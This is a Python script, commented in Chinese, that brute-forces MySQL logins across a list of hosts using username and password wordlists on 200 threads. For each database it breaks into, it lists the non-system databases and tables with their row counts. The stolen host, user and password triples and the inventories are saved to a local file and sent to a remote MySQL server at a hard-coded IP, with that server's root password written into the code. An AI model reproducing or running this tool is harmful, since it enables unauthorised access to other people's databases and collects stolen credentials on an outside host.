
"""
    1. 读取用户名
    2. 读取密码
    3. 读取主机
    4. 尝试连接主机
    5. 保存有效结果

    -- Juaran 2019-07-26 20:00
"""

import threading
import queue
import time
import pymysql
import mysql.connector
import warnings
warnings.filterwarnings("ignore")


def save_data(host, user, passwd, mysql_info):
    """保存本地数据库"""

    create_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

    try:
        db = pymysql.connect(host=save_mysql['host'], port=save_mysql['port'], user=save_mysql['user'],
                             password=save_mysql['password'], db=save_mysql['db'])
        sql = """CREATE TABLE IF NOT EXISTS %s""" % save_mysql['tb'] + \
              """(id INT(20) AUTO_INCREMENT, host_info VARCHAR(255) UNIQUE, mysql_info VARCHAR(2155), create_time VARCHAR(255),  PRIMARY KEY(id))"""
        db.cursor().execute(sql)  # 建表

        db.cursor().execute("""INSERT IGNORE INTO %s""" % save_mysql['tb'] +
                            """(host_info, mysql_info, create_time) VALUES(%s, %s, %s)""", (
                                host + "\t" + user + "\t" + passwd, mysql_info, create_time))
        db.commit()
        print("[* 保存数据库成功 *]")
    except Exception as e:
        print("[* 保存数据库错误：", e, "*]")

    with open("result.txt", "a", encoding="utf8") as f:
        f.write("\n========== 主机地址: " + host + " " + user + " " + passwd + " ==========\n" +
                mysql_info +
                "\n========== 创建时间: " + create_time + " ==========\n")


def scan(host, user, passwd):
    """ 扫描 """

    try:
        db = mysql.connector.connect(host=host, user=user, password=passwd, connect_timeout=0.3)
        print("[* Success *] %s@%s by %s" % (user, host, passwd))

        # 查询筛选表内容
        mysql_info = Hunter(db).query()
        if mysql_info is not None:
            save_data(host, user, passwd, mysql_info)

        db.close()
    except Exception as e:
        print("\r[x] %s@%s by %s" % (user, host, passwd), end="")


class Hunter(object):
    def __init__(self, db, ):
        self.db = db
        self.cursor = db.cursor()
        self.exclude_db = ['mysql', 'sys', 'information_schema', 'performance_schema', 'test']

    def query(self):
        """ 查询筛选数据库信息 """

        databases = self.show_database()
        mysql_info = list()  # 所有库信息记录
        for database in databases:
            tables = self.show_table(database)  # 筛选表
            db_tb_info = self.database_table_info(database, tables)  # 一个库信息
            mysql_info.extend(db_tb_info)  # 多个库信息

        if len(mysql_info) > 0:
            mysql_info = "\n".join(mysql_info)
            print(mysql_info)
            return mysql_info


    def show_database(self):
        """返回数据库列表"""

        self.cursor.execute('show databases')  # 显示所有数据库
        databases = self.cursor.fetchall()
        databases = [database[0] for database in databases if database[0] not in self.exclude_db]
        return databases  # 数据库名列表


    def show_table(self, database):
        """查看数据库中的表"""

        sql = """SELECT TABLE_NAME, TABLE_ROWS from information_schema.TABLES
                  WHERE TABLE_SCHEMA = %s and TABLE_ROWS > %s ORDER BY TABLE_ROWS DESC"""

        # 筛选条件：information_schema库中当前库下表行数大于limit_rows
        self.cursor.execute(sql, (database, limit_rows))
        tables = self.cursor.fetchall()
        return tables  # [('result', 2), ('表名', 行数)]

    def database_table_info(self, database, tables):
        """ 生成库和表信息记录 """

        one_db_info = list()
        for table in tables:
            db_tb_info = database + '\t' + table[0] + '\t' + str(table[1])  # 库名 + 表名 + 表行数
            one_db_info.append(db_tb_info)
        return one_db_info


class Processor(object):
    def __init__(self):
        self.host_q = queue.Queue(1000)  # 读取host文件的队列
        self.round_end = False  # 结束标识
        self.lock = threading.Lock()
        self.user_q = queue.Queue(1000)

    @staticmethod
    def host_iterator():
        """ 生成器，缓冲读取ip文件 """
        with open(host_file, mode="r") as f:  # 文件读入内存
            for line in f:
                host = line.strip()  # 主机地址
                yield host

    @staticmethod
    def user_iterator():
        """ 生成器，缓冲读取user文件 """
        with open(user_file, mode="r") as f:  # 文件读入内存
            for line in f:
                user = line.strip()  # 主机地址
                yield user

    @staticmethod
    def passwd_iterator():
        """ 生成器，缓冲读取passwd文件 """
        with open(passwd_file, mode="r") as f:  # 文件读入内存
            for line in f:
                passwd = line.strip()  # 主机地址
                yield passwd

    def put_host(self):
        """ 读取txt, 填充 host 队列 """
        hosts = self.host_iterator()  # host 生成器
        while True:
            try:
                host = next(hosts)  #
                # print("[*] Put host %s into queue. " % host, )
                self.host_q.put(host)  # ip 进队列  nowait: 队列满则阻塞
            except StopIteration:
                # print("[!] End of the host file! ")
                break

    def get_host(self, user, passwd):
        """ 获取 host 队列，填充 scan 队列 """
        while not self.host_q.empty():
            host = self.host_q.get()
            # print("[*] Get host %s from queue. " % host, )
            scan(host, user, passwd)  # 扫描

    def run(self, user, passwd):
        """ 主线程控制 """
        print("\n[* 开始 %s:%s 的轮转扫描 *]" % (user, passwd))

        t1 = threading.Thread(target=self.put_host, )  # 读取主机
        t1.start()
        for i in range(threads):  # 多线程扫描
            t2 = threading.Thread(target=self.get_host, args=(user, passwd, ))
            t2.start()

        while True:
            if len(threading.enumerate()) == 1:
                print("\n[* 结束 %s:%s 的轮转扫描 *]" % (user, passwd))
                self.round_end = True
                break

    def main(self):
        users = self.user_iterator()
        for user in users:
            passwds = self.passwd_iterator()
            for passwd in passwds:
                # print(user, passwd)
                self.run(user, passwd)
                while True:
                    time.sleep(1)
                    if self.round_end:
                        break
                self.round_end = False


if __name__ == "__main__":

    host_file = "ip2.txt"  # 读取主机文件
    user_file = "user.txt"  # 用户名文件
    passwd_file = "pass.txt"  # 密码文件

    threads = 200  # 线程数量
    limit_rows = 1  # 有效表的最低行数

    # 本地数据库信息
    save_mysql = {
        'host': "119.3.55.220",
        'port': 3306,
        'user': "root",
        'password': "huaweiyun1980/.,",
        'db': 'mysql_scan',  # 数据库名
        'tb': 'mysql_info'  # 表名
    }

    p = Processor()
    p.main()
